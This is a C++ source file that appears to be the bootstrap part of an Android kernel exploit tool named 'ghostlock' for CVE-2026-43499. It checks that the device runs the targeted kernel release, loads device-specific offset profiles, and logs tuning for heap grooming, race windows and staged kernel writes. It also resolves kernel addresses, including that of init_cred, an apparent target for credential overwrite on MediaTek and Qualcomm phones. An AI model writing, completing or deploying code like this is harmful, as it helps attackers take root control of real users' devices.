#include "backend/cve_2026_43499/bootstrap.hpp"

#include "backend/cve_2026_43499_state.hpp"
#include "common.h"
#include "session/core_session.hpp"
#include "support/fatal_error.hpp"

#include <string_view>
#include <sys/utsname.h>

namespace ghostlock::backend {
    void log_execution_settings(const profile::kernel_offsets *profile) {
        if (!profile) return;
        const profile::execution_settings *e = &profile->execution;
        const auto log_exec = [](const char *key, auto value) {
            pr_info("debug.execution.%s=%u\n", key, static_cast<unsigned>(value));
        };
        pr_info("debug.execution.begin release=%s\n", profile->uname_r);
        log_exec("recommended_cpus.main", e->recommended_main_cpu);
        log_exec("recommended_cpus.consumer", e->recommended_consumer_cpu);
        log_exec("selected_cpus.main", config::runtime_config_snapshot().main_cpu);
        log_exec("selected_cpus.consumer", config::runtime_config_snapshot().consumer_cpu);
        log_exec("heap.prepare_max_attempts", e->heap_prepare_max_attempts);
        log_exec("heap.prepare_timeout_ms", e->heap_prepare_timeout_ms);
        log_exec("heap.kernelsnitch_timeout_ms", e->heap_kernelsnitch_timeout_ms);
        log_exec("race.route_wait_ms", e->race_route_wait_ms);
        log_exec("race.setup_settle_us", e->race_setup_settle_us);
        log_exec("race.state_poll_interval_us", e->race_state_poll_interval_us);
        log_exec("stages.w1_attempts", e->w1_attempts);
        log_exec("stages.w1_settle_us", e->w1_settle_us);
        log_exec("stages.w1_scratch_repair_attempts", e->w1_scratch_repair_attempts);
        log_exec("stages.w2_attempts", e->w2_attempts);
        log_exec("stages.w2_settle_us", e->w2_settle_us);
        log_exec("stages.w3_chain_rounds", e->w3_chain_rounds);
        log_exec("stages.w3_attempts", e->w3_attempts);
        log_exec("stages.w3_settle_us", e->w3_settle_us);
        log_exec("routes.tcp_zerocopy.attempts", e->tcp_attempts);
        log_exec("routes.tcp_zerocopy.arm_sequence", e->tcp_arm_sequence);
        log_exec("routes.tcp_zerocopy.post_receive_hold_iterations",
                 e->tcp_post_receive_hold_iterations);
        log_exec("routes.select_stack.enter_delay_us", e->select_enter_delay_us);
        log_exec("routes.select_stack.timeout_us", e->select_timeout_us);
        const profile::McastTuning mcast =
                ghostlock::backend::cve43499_state(session::g_exploit_session).profile.mcast_tuning();
        log_exec("routes.multicast_waiter.attempts", mcast.attempts);
        log_exec("routes.multicast_waiter.arm_sequence", mcast.arm_sequence);
        log_exec("routes.multicast_waiter.arm_hold", mcast.arm_hold);
        log_exec("routes.select_stack.consumer_max_calls", e->select_consumer_max_calls);
        log_exec("routes.select_stack.consumer_burst_calls",
                 e->select_consumer_burst_calls);
        log_exec("handoff.pre_dispatch_settle_ms", e->handoff_pre_dispatch_settle_ms);
        log_exec("handoff.module_poll_attempts", e->handoff_module_poll_attempts);
        log_exec("handoff.module_poll_interval_ms", e->handoff_module_poll_interval_ms);
        log_exec("handoff.enforce_poll_attempts", e->handoff_enforce_poll_attempts);
        log_exec("handoff.enforce_poll_interval_ms", e->handoff_enforce_poll_interval_ms);
        pr_info("debug.execution.end\n");
    }

    /* Entries carry a phys load address only when measured; otherwise MTK uses
     * the DRAM base, xring its constant, qcom its GKI version. */
    void resolve_profile_addresses(void) {
        if (ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.init(&ghostlock::backend::cve43499_state(session::g_exploit_session).profile) != 0)
            throw FatalError{};
        pr_info("soc: %s; kernel_phys_load=0x%llx\n",
                ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.soc_name(&ghostlock::backend::cve43499_state(session::g_exploit_session).profile),
                (unsigned long long) ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.phys_load());
        pr_info("init_cred image=%016zx alias=%016zx\n",
                (size_t) ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.init_cred_image_addr(),
                (size_t) ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.data_alias(
                    ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.init_cred_image_addr()));
    }

    void install_profile(const profile::kernel_offsets &decoded) {
        struct utsname uts;
        if (uname(&uts) < 0) throw FatalError{};
        pr_info("kernel: %s\n", uts.release);
#ifdef TARGET_KERNEL_RELEASE
        if (std::string_view(uts.release) != TARGET_KERNEL_RELEASE) {
            pr_error("build requires kernel %s, got %s\n",
                     TARGET_KERNEL_RELEASE, uts.release);
            throw FatalError{};
        }
#endif
        if (!decoded.uname_r || std::string_view(decoded.uname_r) != uts.release) {
            pr_error("profile release mismatch: expected %s, got %s\n", uts.release,
                     decoded.uname_r ? decoded.uname_r : "<missing>");
            throw FatalError{};
        }
        /* PROFILE-SUGGEST-01: execution tuning arrives fully merged from Kotlin;
         * the native side only consumes the resolved values. */
        ghostlock::backend::cve43499_state(session::g_exploit_session).profile = profile::TargetProfile::from(&decoded);
        pr_success("resolved profile loaded: %s\n",
                   ghostlock::backend::cve43499_state(session::g_exploit_session).profile.release());
        if (config::runtime_config_snapshot().apply_profile(&ghostlock::backend::cve43499_state(session::g_exploit_session).profile) != 0)
            throw FatalError{};
        config::runtime_config_snapshot().log();
        log_execution_settings(ghostlock::backend::cve43499_state(session::g_exploit_session).profile.values());
        resolve_profile_addresses();
    }
} // namespace ghostlock::backend
